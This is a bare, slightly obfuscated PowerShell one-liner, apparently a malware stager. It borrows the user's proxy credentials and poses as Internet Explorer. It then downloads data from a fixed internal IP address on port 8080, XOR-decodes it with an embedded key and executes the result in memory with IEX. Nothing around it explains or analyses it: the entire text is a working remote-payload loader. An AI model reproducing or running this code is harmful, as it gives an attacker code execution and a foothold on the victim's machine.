
[SYSTEm.NEt.SERVIcePOIntMANAgEr]::EXPEcT100ConTinUe = 0;$WC=NeW-OBjeCT SYSTEM.NET.WeBCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaDers.Add('User-Agent',$u);$WC.ProXy = [SyStem.NET.WEbRequest]::DEFaULTWEBProxY;$wc.Proxy.CredENtIaLs = [SySTEm.NeT.CredentiAlCACHe]::DefAuLtNetwORkCReDEntiaLS;$K='81dc9bdb52d04dc20036dbd8313ed055';$I=0;[ChaR[]]$B=([chaR[]]($WC.DOwNloAdSTRING("http://10.51.30.96:8080/index.asp")))|%{$_-bXOr$k[$i++%$k.LenGTh]};IEX ($b-jOiN'')

